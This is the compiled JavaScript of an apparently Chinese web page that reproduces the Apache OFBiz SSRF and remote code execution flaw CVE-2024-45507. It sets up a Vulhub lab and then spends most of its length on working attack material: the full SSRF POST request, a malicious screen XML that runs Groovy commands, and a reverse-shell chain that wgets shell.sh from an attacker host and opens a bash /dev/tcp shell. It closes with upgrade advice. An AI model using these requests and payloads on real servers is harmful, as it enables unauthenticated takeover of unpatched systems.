import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o as l,c,a,b as n,d as s,e as o}from"./app-58e4a7d6.js";const p={},r=a("h2",{id:"漏洞描述",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),d=a("p",null,"Apache OFBiz 是一个开源企业资源规划（ERP）系统。它提供了一套企业应用程序，集成并自动化企业的许多业务流程。",-1),u=a("p",null,"Apache OFBiz 18.12.16 之前的版本存在一处 SSRF 与远程命令执行漏洞，未经身份验证的攻击者可以利用该漏洞执行任意命令并控制服务器。",-1),v=a("p",null,"参考链接：",-1),g={href:"https://github.com/apache/ofbiz-framework/commit/ffb1bc4879",target:"_blank",rel:"noopener noreferrer"},m={href:"https://xz.aliyun.com/t/15569",target:"_blank",rel:"noopener noreferrer"},h={href:"https://paper.seebug.org/3228/",target:"_blank",rel:"noopener noreferrer"},b=o(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache OFBiz &lt; 18.12.16
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Apache_OFBiz&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 Apache OfBiz 18.12.15 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在等待数分钟后，访问 <code>https://your-ip:8443/accounting</code> 查看到登录页面，说明环境已启动成功。</p><p>如果非本地 localhost 启动，Headers 需要包含 <code>Host: localhost</code>，否则报错：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ERROR MESSAGE
org.apache.ofbiz.webapp.control.RequestHandlerException: Domain your-ip not accepted to prevent host header injection. 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240918162954722.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="ssrf-漏洞" tabindex="-1"><a class="header-anchor" href="#ssrf-漏洞" aria-hidden="true">#</a> SSRF 漏洞</h3><p>向 <code>/webtools/control/forgotPassword/StatsSinceStart</code> 发送以下 POST 请求即可：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
Host: your-ip:8443
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

statsDecoratorLocation=http://10.10.10.10/path/to/api
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240918163414162.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="远程代码执行漏洞" tabindex="-1"><a class="header-anchor" href="#远程代码执行漏洞" aria-hidden="true">#</a> 远程代码执行漏洞</h2><p>首先在服务器 <code>&lt;attacker-ip&gt;</code> 上部署恶意 XML 文件 payload.xml：</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>screens</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">&quot;</span></span>
        <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://ofbiz.apache.org/Widget-Screen<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>screen</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>StatsDecorator<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>actions</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>set</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>\${groovy:&#39;touch /tmp/awesome_poc&#39;.execute();}<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>actions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>screen</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>screens</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后将恶意 XML 的 URL 替换进请求中发送：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1
Host: localhost:8443
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

statsDecoratorLocation=http://&lt;attacker-ip&gt;/payload.xml
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240918163838836.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>命令 <code>touch /tmp/awesome_poc</code> 已经被成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240918164140447.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>reverse shell payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 1. 在服务器 &lt;attcker-ip&gt; 托管 shell.sh：
echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/&lt;attcker-ip&gt;/8888 0&gt;&amp;1&quot; &gt; shell.sh

# 2. 发送第一个数据包。在服务器 &lt;attcker-ip&gt; 托管 payload.xml，下载 shell.sh：
&lt;actions&gt;
	&lt;set value=&quot;\${groovy:&#39;wget &lt;attcker-ip&gt;/shell.sh&#39;.execute();}&quot;/&gt;
&lt;/actions&gt;

# 3. 发送第二个数据包。在服务器 &lt;attcker-ip&gt; 托管 payload.xml，执行shell.sh：
&lt;actions&gt;
	&lt;set value=&quot;\${groovy:&#39;bash shell.sh&#39;.execute();}&quot;/&gt;
&lt;/actions&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><p>升级至 18.12.16 及以上版本。</p>`,28);function k(x,f){const e=i("ExternalLinkIcon");return l(),c("div",null,[r,d,u,v,a("ul",null,[a("li",null,[a("a",g,[n("https://github.com/apache/ofbiz-framework/commit/ffb1bc4879"),s(e)])]),a("li",null,[a("a",m,[n("https://xz.aliyun.com/t/15569"),s(e)])]),a("li",null,[a("a",h,[n("https://paper.seebug.org/3228/"),s(e)])])]),b])}const S=t(p,[["render",k],["__file","Apache OFBiz SSRF 和远程代码执行漏洞 CVE-2024-45507.html.vue"]]);export{S as default};
